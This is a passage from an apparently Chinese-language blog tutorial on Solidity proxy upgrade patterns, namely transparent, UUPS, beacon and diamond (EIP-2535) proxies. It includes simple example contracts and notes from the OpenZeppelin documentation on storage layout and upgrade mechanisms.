class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract TransparentProxy &#123;</span><br><span class="line">    address implementation; <span class="comment">// logic合约地址</span></span><br><span class="line">    address admin; <span class="comment">// 管理员</span></span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，初始化admin和逻辑合约地址</span></span><br><span class="line">    <span class="keyword">constructor</span>(address _implementation)&#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fallback函数，将调用委托给逻辑合约</span></span><br><span class="line">    <span class="comment">// 不能被admin调用，避免选择器冲突引发意外</span></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender != admin);</span><br><span class="line">        (bool success, bytes memory data) = implementation.delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 升级函数，改变逻辑合约地址，只能由admin调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upgrade</span>(<span class="params">address newImplementation</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender != admin) revert();</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="逻辑合约"><a href="#逻辑合约" class="headerlink" title="逻辑合约"></a>逻辑合约</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧逻辑合约</span></span><br><span class="line">contract Logic1 &#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器： 0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"old"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新逻辑合约</span></span><br><span class="line">contract Logic2 &#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器：0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"new"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="管理者合约"><a href="#管理者合约" class="headerlink" title="管理者合约"></a>管理者合约</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol"</span>;</span><br></pre></td></tr></table></figure><p>openzeppelin给我们提供了一个辅助合同，旨在被分配为 <code>TransparentUpgradeableProxy</code>的管理员。对于一个 解释为什么要使用它，请参阅 <a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#TransparentUpgradeableProxy" target="_blank" rel="noopener"><code>TransparentUpgradeableProxy</code></a> 的文档。</p><p>在本合约是管理者的情况下，调用<code>upgrade(proxy, _implementation)</code>或<code>upgradeAndCall(proxy, implementation, data)</code>即可</p><h3 id="通用可升级代理—UUPS"><a href="#通用可升级代理—UUPS" class="headerlink" title="通用可升级代理—UUPS"></a>通用可升级代理—UUPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;proxy&#x2F;utils&#x2F;UUPSUpgradeable.sol&quot;;</span><br></pre></td></tr></table></figure><p>UUPS 的名称来自 <a href="https://eips.ethereum.org/EIPS/eip-1822" target="_blank" rel="noopener">EIP1822</a>，它首先记录了该模式。</p><p>在该模式中，升级函数存在于逻辑合约中而非代理合约。这也使得管理员随时可以把合约变为不可升级的合约。</p><p>UUPS和透明代理共享相同的升级接口，但在 UUPS 代理中，升级由实现处理，最终可以删除。另一方面，透明代理在代理本身中包含升级和管理逻辑。这意味着<code>TransparentUpgradeableProxy</code>的部署成本高于UUPS代理。</p><p>UUPS 代理是使用 <code>ERC1967Proxy</code>实现的。请注意，UUPS代理本身不可升级。实现<code>ERC1967Proxy</code>的作用是，除了合约的逻辑之外，还包括更新存储在代理存储空间中特定插槽中的实现地址所需的所有代码。这就是<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable" target="_blank" rel="noopener"><code>UUPSUpgradeable</code></a>合约的用武之地。从它继承（并使用相关的访问控制机制覆盖<code>_authorizeUpgrade</code>函数将使您的合约变成符合 UUPS 的实现。</p><p>请注意，由于两个代理使用相同的存储槽作为实现地址，因此将符合 UUPS 的实现与 <code>TransparentUpgradeableProxy</code>一起使用可能允许非管理员执行升级操作。</p><p>默认情况下，<code>UUPSUpgradeable</code>中包含的升级功能包含一种安全机制，该机制将阻止对不符合 UUPS 的实现进行任何升级。这可以防止升级到不包含必要升级机制的实现协定，因为它会永久锁定代理的可升级性。以下任一方法都可以绕过此安全机制：</p><ul><li>在实现中添加一个标志机制，该机制将在触发时禁用升级功能。</li><li>升级到具有升级机制的实现，而无需额外的安全检查，然后再次升级到没有升级机制的另一个实现。</li></ul><p>此安全机制的当前实现使用 <a href="https://eips.ethereum.org/EIPS/eip-1822" target="_blank" rel="noopener">EIP1822</a> 来检测实现使用的存储槽。以前的实现（现已弃用）依赖于回滚检查。可以从使用旧机制的合约升级到新合约。然而，相反是不可能的，因为旧的实现（4.5 版之前）不包括接口。<code>ERC1822</code></p><p><code>oz</code>库中UUPS实现的call graph：</p><p><img src="UUPS.png" alt=""></p><h4 id="简单实现-2"><a href="#简单实现-2" class="headerlink" title="简单实现"></a>简单实现</h4><h5 id="代理合约-2"><a href="#代理合约-2" class="headerlink" title="代理合约"></a>代理合约</h5><p>UUPS的代理合约看起来像是个不可升级的代理合约，非常简单，因为升级函数被放在了逻辑合约中。它包含<code>3</code>个变量：</p><ul><li><code>implementation</code>：逻辑合约地址。</li><li><code>admin</code>：admin地址。</li><li><code>words</code>：字符串，可以通过逻辑合约的函数改变。</li></ul><p>它包含<code>2</code>个函数</p><ul><li>构造函数：初始化admin和逻辑合约地址。</li><li><code>fallback()</code>：回调函数，将调用委托给逻辑合约。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract UUPSProxy &#123;</span><br><span class="line">    address public implementation; <span class="comment">// 逻辑合约地址</span></span><br><span class="line">    address public admin; <span class="comment">// admin地址</span></span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，初始化admin和逻辑合约地址</span></span><br><span class="line">    <span class="keyword">constructor</span>(address _implementation)&#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fallback函数，将调用委托给逻辑合约</span></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool success, bytes memory data) = implementation.delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="逻辑合约-1"><a href="#逻辑合约-1" class="headerlink" title="逻辑合约"></a>逻辑合约</h5><p>UUPS的逻辑合约与透明代理中的不同是多了个升级函数。UUPS逻辑合约包含<code>3</code>个状态变量，与保持代理合约一致，防止插槽冲突。它包含<code>2</code>个</p><ul><li><code>upgrade()</code>：升级函数，将改变逻辑合约地址<code>implementation</code>，只能由<code>admin</code>调用。</li><li><code>foo()</code>：旧UUPS逻辑合约会将<code>words</code>的值改为<code>&quot;old&quot;</code>，新的会改为<code>&quot;new&quot;</code>。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UUPS逻辑合约（升级函数写在逻辑合约内）</span></span><br><span class="line">contract UUPS1&#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器： 0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"old"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010</span></span><br><span class="line">    <span class="comment">// UUPS中，逻辑函数中必须包含升级函数，不然就不能再升级了。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upgrade</span>(<span class="params">address newImplementation</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == admin);</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新的UUPS逻辑合约</span></span><br><span class="line">contract UUPS2&#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器： 0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"new"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010</span></span><br><span class="line">    <span class="comment">// UUPS中，逻辑函数中必须包含升级函数，不然就不能再升级了。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upgrade</span>(<span class="params">address newImplementation</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == admin);</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="oz库的完整实现"><a href="#oz库的完整实现" class="headerlink" title="oz库的完整实现"></a>oz库的完整实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;proxy&#x2F;utils&#x2F;UUPSUpgradeable.sol&quot;;</span><br></pre></td></tr></table></figure><p><code>UUPSUpgradeable</code>是专为 UUPS 代理设计的可升级性机制。此处包含的函数可以执行<code>ERC1967Proxy</code>的升级，当此合约设置为此类代理后面的实现时。</p><p>安全机制可确保升级不会意外关闭可升级性，尽管此风险是 如果升级保留可升级性但删除了安全机制，例如，通过替换为升级的自定义实现，则恢复。<code>UUPSUpgradeable</code></p><p>必须覆盖<code>_authorizeUpgrade</code>函数以包括对升级机制的访问限制。</p><h5 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h5><div class="table-container"><table><thead><tr><th>onlyProxy()</th></tr></thead><tbody><tr><td>检查是否通过委托调用调用执行，以及执行上下文是否为 具有指向 self 的实现（如 ERC1967 中所定义）的代理合约。应该只是这种情况 对于使用当前合同作为其实现的 UUPS 和透明代理。执行 通过ERC1167的功能 最小代理（克隆）通常不会通过此测试，但不能保证 失败。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>notDelegated()</th></tr></thead><tbody><tr><td>检查是否未通过委托调用执行。这允许函数 可在实施合同上调用，但不能通过代理调用</td></tr></tbody></table></div><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><div class="table-container"><table><thead><tr><th>onlyProxy()</th></tr></thead><tbody><tr><td>检查是否通过委托调用调用执行，以及执行上下文是否为 具有指向 self 的实现（如 ERC1967 中所定义）的代理合约。应该只是这种情况 对于使用当前合同作为其实现的 UUPS 和透明代理。执行 通过ERC1167的功能 最小代理（克隆）通常不会通过此测试，但不能保证 失败。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>notDelegated()</th></tr></thead><tbody><tr><td>检查是否通过委托调用调用执行，以及执行上下文是否为 具有指向 self 的实现（如 ERC1967 中所定义）的代理合约。应该只是这种情况 对于使用当前合同作为其实现的 UUPS 和透明代理。执行 通过ERC1167的功能 最小代理（克隆）通常不会通过此测试，但不能保证 失败。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>proxiableUUID() → bytes32</th></tr></thead><tbody><tr><td>ERC1822 <code>proxiableUUID</code>函数的实现。这将返回 实现。它用于在执行升级时验证实现的兼容性。</td></tr><tr><td>注意：</td></tr><tr><td>指向可代理合约的代理本身不应被视为可代理合约，因为存在风险 砖砌一个升级到它的代理，通过委派给自己直到耗尽气体。因此，至关重要的是 如果通过代理调用，则函数还原。这是由修饰符<code>notDelegated()</code>保证的。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>upgradeTo(address newImplementation)</th></tr></thead><tbody><tr><td>①将代理的实现升级到 。<code>newImplementation</code>。②呼叫<code>_authorizeUpgrade</code>。③发出升级事件。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>upgradeToAndCall(address newImplementation, bytes data)</th></tr></thead><tbody><tr><td>①将代理的实现升级到 ，然后执行函数调用 以 编码。<code>newImplementation``data</code>。②呼叫<code>_authorizeUpgrade</code>③发出升级事件</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>_authorizeUpgrade(address newImplementation)</th></tr></thead><tbody><tr><td>在无权升级合约时应还原的功能。通过升级<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-upgradeTo-address-" target="_blank" rel="noopener"><code>到</code></a>和<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-upgradeToAndCall-address-bytes-" target="_blank" rel="noopener"><code>升级到和调用调用</code></a>。通常，此函数将使用<a href="https://docs.openzeppelin.com/contracts/4.x/api/access" target="_blank" rel="noopener">访问控制</a>修饰符，例如 <code>function _authorizeUpgrade(address) internal override onlyOwner {}</code></td></tr></tbody></table></div><h3 id="信标代理—Beacon"><a href="#信标代理—Beacon" class="headerlink" title="信标代理—Beacon"></a>信标代理—Beacon</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;proxy&#x2F;beacon&#x2F;BeaconProxy.sol&quot;;</span><br></pre></td></tr></table></figure><p>以上两种代理，都存在一种缺陷，就是如果我要升级一批具有相同逻辑合约的代理合约，那么需要在每个代理合约都执行一遍升级（因为每个代理合约独立存储了_implementation）。信标合约，就是将所有的具有相同逻辑合约的代理合约的_implementation只存一份在信标合约中，所有的代理合约通过和信标合约接口调用，获取_implementation，这样，在升级的时候，就可以只升级信标合约，就能搞定所有的代理合约的升级。</p><p><img src="Beacon.png" alt=""></p><h4 id="简单实现-3"><a href="#简单实现-3" class="headerlink" title="简单实现"></a>简单实现</h4><h5 id="代理合约-3"><a href="#代理合约-3" class="headerlink" title="代理合约"></a>代理合约</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数需要信标合约的地址，所以信标合约要先部署。将信标合约的地址传给代理合约进行构造。</span></span><br><span class="line"><span class="keyword">constructor</span>(address beacon, bytes memory data) payable &#123;</span><br><span class="line">    _upgradeBeaconToAndCall(beacon, data, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从信标合约获取实现。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_implementation</span>(<span class="params"></span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> IBeacon(_getBeacon()).implementation();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="信标合约"><a href="#信标合约" class="headerlink" title="信标合约"></a>信标合约</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 构造函数需要逻辑合约的实现，所以先要部署逻辑合约，再部署信标合约。</span><br><span class="line">constructor(address implementation_) &#123;</span><br><span class="line">    _setImplementation(implementation_);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 升级直接升级信标合约的implementation即可。</span><br><span class="line">function upgradeTo(address newImplementation) public virtual onlyOwner &#123;</span><br><span class="line">    _setImplementation(newImplementation);</span><br><span class="line">    emit Upgraded(newImplementation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="钻石代理—Diamond"><a href="#钻石代理—Diamond" class="headerlink" title="钻石代理—Diamond"></a>钻石代理—Diamond</h3><p>EIP-2535 是以太坊上一个将合约进行代码模块化组合的提案，其目的是为了让大型的智能合约突破 24kb 大小的最大限制，并且让合约更方便地更新功能。</p><p>钻石代理，较EIP1967来讲，最大的改变其实是在存储模型上的改进，笔者在阅读钻石代理相关文档的时候，感觉又被酷到，这里的钻石术语让我感觉很有意思，但同时也增加了审计代码的困难度。</p><p>虽然钻石代理的设计模式非常好，但笔者不认为这个代理模式会对现在市面上最常见的以EIP1967为基础的透明代理和UUPS的地位造成威胁。一是因为钻石代理模式相对比较复杂，开发周期会延长，且现目前<code>OZ</code>库中所实现的三种代理模式足够满足绝大多数项目的需求。二是<code>oz</code>方面对实现钻石代理并不感兴趣，毕竟在代理方面，稍不注意就会出现漏洞，还涉及文档和其他材料、对升级插件和 OpenZeppelin Defender 中模式的支持，这对钻石代理的发展明显是不利的。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>要理解钻石协议，首先有几个相关的概念定义需要知道：</p><ul><li><strong>钻石（diamond）</strong> : 钻石可以理解为代理合约（Proxy），也是与用户进行交互的主合约</li><li><strong>切面（facet）</strong> : 正如真正的钻石有不同的侧面一样，一个钻石合约也有着不同的面，钻石合约的每个功能所需要调用的合约对应一个切面，所以也可以理解为实现合约 （Implementation）</li><li><strong>钻石切割（diamondCut）</strong> : 钻石协议标准扩展了一种叫钻石切割的功能，其主要作用从钻石中增加、替换或删除切面和功能，可以理解为合约的升级 （Upgrade）</li><li><strong>放大镜（The Loupe）</strong> : 钻石协议标准中的放大镜功能主要是返回关于切面的信息和钻石存在的功能，这些信息是保存在钻石合约内部的存储结构——DiamondStorage 中</li></ul><p>钻石模型：</p><p><img src="Diamond_info.png" alt=""></p><p>通过使用钻石标准规范去创建钻石合约，这个合约可以像使用当前合约的代码一样使用任何数量的其他切面合约的代码。</p><p>在该钻石合约中不同的函数功能需要调用对应的不同的切面合约的代码来实现，并且可以利用钻石切割的功能来对钻石合约中的函数功能进行修改（添加、替换或删除）。</p><p>这与市面上大多数使用一个代理合约和一个实现合约来实现交互与升级的方式有所区别。</p><p><img src="Diamond_upgrade.png" alt=""></p><h4 id="亮点"><a href="#亮点" class="headerlink" title="亮点"></a>亮点</h4><p>提案的草稿声称要给予<code>delegatecall</code>方法提出合约升级的一种新范式。EIP 2535 提议使用：</p><ol><li>与实现合约适配的查找表（lookup table）</li><li><strong>任意的存储指针</strong>（arbitrary storage pointer）</li></ol><h5 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h5><p>基于 delegatecall 的升级方法主要使用两个组件：一个代理合约和一个实现合约</p><p><img src="Diamond_lookup.png" alt=""></p><p>用户与代理合约交互，代理合约向实现合约发送 delegatecall 调用实现合约内的函数。执行的是实现合约内的代码，但整套合约的 storage 保存在代理合约内。</p><p>使用了查找表，代理合约就可以向<strong>多个逻辑合约</strong>发起 delegatecall 调用，可根据要调用的函数来选择合适的实现合约。</p><p><img src="Diamond_lookup2.png" alt=""></p><p>其实这种模式不是什么新东西。之前也有其他项目使用过这样的查找表来实现可升级性。例如<code>ColonyNetwork</code></p><h5 id="钻石存储——任意的存储指针"><a href="#钻石存储——任意的存储指针" class="headerlink" title="钻石存储——任意的存储指针"></a>钻石存储——任意的存储指针</h5><p>请注意不要和非结构化存储混淆，二者从根本上不一样。</p><p>钻石提案还建议使用 Solidity 最近引入的一个功能：任意的存储指针。这个功能名副其实，就是允许你把一个 storage 的指针指向任意一个位置。</p><p><code>EIP2535</code>作者<strong>Nick Mudge</strong>对钻石代理存储模式的解释：</p><p><a href="https://medium.com/1milliondevs/new-storage-layout-for-proxy-contracts-and-diamonds-98d01d0eadb" target="_blank" rel="noopener">New Storage Layout For Proxy Contracts and Diamonds | by Nick Mudge | 1MillionDevs | Medium</a></p><ol><li>创建合同。这是一个钻石存储合同，但我们称之为“存储合同”，因为它更短。</li><li>在存储协定中创建一个结构，其中包含您关注的状态变量。</li><li>选择存储中的位置来读取和写入结构。</li><li>在存储协定中编写一个函数，该函数为结构创建存储指针并返回它。</li><li>任何需要读取/写入存储协定中定义的状态变量的协定/代理/分面只需要继承存储协定并调用返回存储指针的函数。</li></ol><p>下面是一个使用钻石存储的合同的简单示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract MyStorageContract &#123;</span><br><span class="line"><span class="comment">// The state variables we care about.</span></span><br><span class="line">  struct MyStorage &#123;</span><br><span class="line">    uint aVar;</span><br><span class="line">    bytes myBytes;</span><br><span class="line">    mapping(<span class="function"><span class="params">uint</span> =&gt;</span> bytes32) myMap;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// Creates and returns the storage pointer to the struct.</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myStorage</span>(<span class="params"></span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span>(<span class="params">MyStorage storage ms</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ms_slot = keccak256("com.mycompany.my.storage")</span></span><br><span class="line">    assembly &#123;ms.slot := <span class="number">0xabcd55b489adb030b</span>...d09c4154cf0&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果您想查看真实示例，请查看最近更新为使用钻石存储的<a href="https://github.com/mudgen/Diamond" target="_blank" rel="noopener">钻石标准的参考实现</a>。具体看看<a href="https://github.com/mudgen/diamond-1/blob/master/contracts/libraries/LibDiamond.sol" target="_blank" rel="noopener">LibDiamond.sol</a>。</p><p>下面是使用上述 <code>MyStorageContract</code> 的代码示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract is MyStorageContract &#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params">uint selector, bytes32 myData</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">   MyStorage storage ms = myStorage();</span><br><span class="line">   ms.myMap[selector] = myData;</span><br><span class="line">   ms.aVar = uint(myData);</span><br><span class="line">   <span class="comment">//... more code;</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnMyData</span>(<span class="params">uint selector</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">bytes32</span>)</span>&#123;</span><br><span class="line">   MyStorage storage ms = myStorage();</span><br><span class="line">   bytes32 data = ms.myMap[selector];</span><br><span class="line">   <span class="comment">//... more code</span></span><br><span class="line">   <span class="keyword">return</span> data;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 storage 都存储在代理合约里，实现合约的 storage 布局必须与代理合约的 storage 布局保持一致。在升级的时候，很难跟踪这种布局。</p><p>这个 EIP 提议，每个实现合约都要有一个相关联的结构体来保管实现合约的变量，然后用一个指针指向存储该结构体的 storage 位置。这类似于 <code>unstructured storage</code>模式，也是 Solidity 的一个新功能，支持使用一个结构体来替代一个单一的变量。</p><p>此处的假定是：来自两个不同实现的结构体不可能冲突，只要它们的基础指针（base pointer）不同。</p><p><img src="Diamond_storagepoint.png" alt=""></p><h5 id="任意存储指针vs非结构化存储"><a href="#任意存储指针vs非结构化存储" class="headerlink" title="任意存储指针vs非结构化存储"></a>任意存储指针vs非结构化存储</h5><ul><li><p>非结构化存储</p><blockquote><p><em>Solidity的存储布局可以通过汇编绕过，允许程序员在合约存储中的任意位置设置和存储值。这就是非结构化存储模式。</em></p></blockquote><ul><li><p>缺点：</p><blockquote><ol><li>需要为每个存储变量定义和使用 getter 和 setter 函数。</li><li>这适用于简单值。它不适用于结构或映射。</li></ol></blockquote></li></ul></li><li><p>任意存储指针</p></li></ul><p>​        钻石存储与非结构化存储模式有一些相似之处，因为它使用程序集绕过了 Solidity 的默认存储布局。但是钻石存储有几个主要区别，没有缺点。</p><ol><li>钻石存储只有一个 getter 函数，该函数返回指向可以包含任意数量值的结构的存储指针。存储指针直接用于读取和写入值到存储。</li><li>钻石存储与可以包含多个简单值、数组、映射和其他结构的结构一起工作。</li></ol><h4 id="放大镜（The-Loupe）"><a href="#放大镜（The-Loupe）" class="headerlink" title="放大镜（The Loupe）"></a>放大镜（The Loupe）</h4><p>Loupe可以说是钻石代理全新的东西，Eip作者Nick Mudge也做出了全面的解答。</p><p><a href="https://eip2535diamonds.substack.com/p/why-on-chain-loupe-functions-are" target="_blank" rel="noopener">Why On-Chain Loupe Functions are Good - by Nick Mudge 💎 (substack.com)</a></p><p><a href="https://dev.to/mudgen/why-loupe-functions-for-diamonds-1kc3" target="_blank" rel="noopener">Diamond Loupe Functions - DEV Community 👩‍💻👨‍💻</a></p><blockquote><p>放大镜是用来观察钻石的放大镜。</p><p>在 <a href="https://eips.ethereum.org/EIPS/eip-2535" target="_blank" rel="noopener">EIP-2535 